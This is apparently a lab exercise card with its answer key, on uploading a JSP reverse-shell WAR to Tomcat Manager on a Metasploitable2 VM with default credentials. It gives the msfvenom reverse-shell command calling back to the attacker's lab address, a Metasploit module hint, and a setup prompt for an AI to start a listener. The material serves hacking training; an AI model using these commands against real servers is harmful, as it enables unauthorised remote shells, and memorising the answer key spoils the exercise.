# Q047 — Tomcat WAR Upload Shell

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🔴 Hard |
| **Tools** | `msfvenom, curl` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Use Tomcat manager creds `tomcat:tomcat` on Metasploitable:8180 to deploy a JSP WAR shell. Provide msfvenom command used to create the WAR.

---

## 🎯 Flag Format

```
msfvenom_cmd=<short>
```

Example: `msfvenom_cmd=msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.52.128 LPORT=4444 -f war`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Then upload via /manager/html.
</details>

<details>
<summary>Hint 2</summary>

Or use msf module `exploit/multi/http/tomcat_mgr_upload`.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.52.128 LPORT=4444 -f war > shell.war
# Upload via Tomcat Manager
```

Connecting to /shell/ triggers reverse shell.

**Answer:** `msfvenom_cmd=msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.52.128 LPORT=4444 -f war`

📖 Ref: [playbooks/web-servers-playbook.md](../../playbooks/web-servers-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q047:
1. Verify Metasploitable2 (192.168.52.129) up; tomcat55 running (sudo service tomcat55 status).
2. Confirm Tomcat Manager accessible: curl -u tomcat:tomcat http://192.168.52.129:8180/manager/html — 200 OK.
3. Parrot: msfvenom available (part of metasploit-framework).
4. Start a listener before deploy: msfconsole -q -x 'use multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp; set LHOST 192.168.52.128; set LPORT 4444; run'.

Report back: "Lab ready for Q047 — Tomcat manager reachable on 192.168.52.129:8180 with tomcat/tomcat".
```
